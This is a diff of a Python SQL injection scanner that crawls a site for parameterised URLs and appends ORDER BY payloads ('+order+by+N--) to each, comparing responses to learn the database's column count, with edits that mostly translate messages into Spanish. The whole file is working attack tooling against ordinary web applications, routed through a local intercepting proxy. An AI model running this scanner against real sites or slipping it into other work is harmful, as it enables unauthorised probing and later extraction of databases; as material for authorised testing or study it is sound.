@@ -9,20 +9,23 @@ from urllib.parse import urlparse
 
 proxies = {'http': 'http://127.0.0.1:8081', 'https': 'http://127.0.0.1:8081'}
 
-# Función para realizar la solicitud con reintentos
+# request with tries
 def get_response(url, retries=3):
     for i in range(retries):
         try:
             r = requests.get(url, verify=False, proxies=proxies)
             if r.status_code == 200:
                 return r
+            elif r.status_code == 403:
+                print(f"[+] Felicitaciones, su página web es segura: el acceso a {url} fue bloqueado con un código 403 (Forbidden).")
+                return r
         except requests.RequestException as e:
-            print(f"[!] Error fetching {url}: {e}. Retrying ({i+1}/{retries})...")
-            time.sleep(random.uniform(1, 3))  # Espera aleatoria entre reintentos
+            #print(f"[!] Error fetching {url}: {e}. Retrying ({i+1}/{retries})...")
+            time.sleep(random.uniform(1, 3))  
     print(f"[-] Failed to retrieve {url} after {retries} retries.")
     return None
 
-# Crawler para encontrar rutas que acepten parámetros (GET)
+# try to get paths with get parameter
 def find_urls_to_test(url, base_url):
     response = get_response(url)
     if not response:
@@ -30,11 +33,9 @@ def find_urls_to_test(url, base_url):
 
     soup = BeautifulSoup(response.text, 'html.parser')
 
-    # Asegúrate de que la base_url no termine con un '/'
     base_url = base_url.rstrip('/')
     parsed_base_url = urlparse(base_url)
 
-    # Encuentra todos los enlaces en la página
     links = set()
     for a_tag in soup.find_all('a', href=True):
         href = a_tag['href']
@@ -48,14 +49,13 @@ def find_urls_to_test(url, base_url):
         if "Id" not in href:
             full_url = href if href.startswith('http') else base_url + href
             links.add(full_url)
-            if "?" in href:  # Solo interesan URLs con parámetros
+            if "?" in href:
                full_url = href if href.startswith('http') else base_url + href
                links.add(full_url)
-            elif href.startswith('/'):  # Enlaces relativos, pueden tener parámetros ocultos
+            elif href.startswith('/'):
                full_url = base_url + href
                links.add(full_url)
 
-    # Si no encontró enlaces, intenta buscar enlaces ocultos en el código fuente
     if not links:
         print("[!] No parameterized URLs found, searching deeper in the page source...")
         scripts = soup.find_all('script')
@@ -71,15 +71,10 @@ def find_urls_to_test(url, base_url):
     
     return links
 
-# Prueba la inyección SQL buscando "Internal Server Error" u otros indicadores
+# perform the sql injection
 def exploit_sqli_column_number(url):
     for i in range(1, 5):
-        if "?" in url:
-            target_url = url + "'+order+by+%s--" % i
-        else:
-            target_url = url + "/'+order+by+%s--" % i
-        #target_url = url + "'+order+by+%s--" % i   
-        print(f"Testing URL: {target_url}")
+        target_url = url + "'+order+by+%s--" % i
         
         r = requests.get(target_url, verify=False, proxies=proxies)
         res = r.text
@@ -107,11 +102,11 @@ if __name__ == "__main__":
         print("\n[+] Testing each URL for SQL Injection vulnerabilities...")
 
         for test_url in urls_to_test:
-            print(f"[+] Testing URL: {test_url}")
+            print(f"\n[+] Testing URL: {test_url}")
             num_col = exploit_sqli_column_number(test_url)
             if num_col:
                 print(f"[+] Vulnerable URL found: {test_url}")
-                print(f"[+] The number of columns is {num_col}.")
+                print(f"[+] Pudimos determinar que su base de datos tiene {num_col} columnas en categoria {test_url}")
             else:
                 print(f"[-] URL not vulnerable: {test_url}")
     else:
